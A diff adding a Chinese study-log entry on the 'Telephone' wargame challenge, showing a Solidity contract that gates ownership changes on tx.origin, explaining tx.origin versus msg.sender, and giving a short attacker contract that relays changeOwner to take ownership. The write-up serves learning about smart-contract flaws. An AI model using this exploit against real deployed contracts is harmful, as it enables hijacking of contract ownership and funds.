@@ -15,6 +15,88 @@ web3萌新
 ## Notes
 
 <!-- Content_START -->
+# 2025-08-20
+
+## 4.Telephone
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+            owner = _owner;
+        }
+    }
+}
+```
+
+**`tx.origin`**：交易的最初发起人（EOA）。
+
+**`msg.sender`**：当前调用者（可能是 EOA 或合约）。
+
+如果直接从钱包（EOA）调用 `changeOwner`，那么 **`tx.origin == msg.sender`**，条件不成立，不能修改 `owner`。
+
+只有当调用经过 **另一个合约转发** 时，`msg.sender = 合约地址`，`tx.origin = EOA`，这两个不相等，条件成立，可以修改 `owner`。
+
+例子如下：
+
+```solidity
+contract A {
+    function callB(address b) public {
+        B(b).foo();
+    }
+}
+
+contract B {
+    function foo() public view returns (address, address) {
+        return (msg.sender, tx.origin);
+    }
+}
+```
+
+调用流程：
+
+1. EOA（Alice）发交易 → 调用 `A.callB(b)`。
+2. 在 `A` 内部又调用 `B.foo()`。
+
+在 `B.foo()` 里：
+
+- `msg.sender = A`（因为直接调用 `foo()` 的是合约 `A`）。
+- `tx.origin = Alice`（因为交易最初来自 Alice）。
+
+攻击脚本
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface attackTelephone {
+    function changeOwner(address _owner) external;
+}
+    
+contract attacker{
+    attackTelephone public target;
+
+    constructor(address _target)
+    {
+        target = attackTelephone(_target);
+    }
+
+    function attack(address myaddr) public
+    {
+        target.changeOwner(myaddr);
+    }
+}
+```
+
 # 2025-08-19
 
 ### 21.合约如何调用其他合约
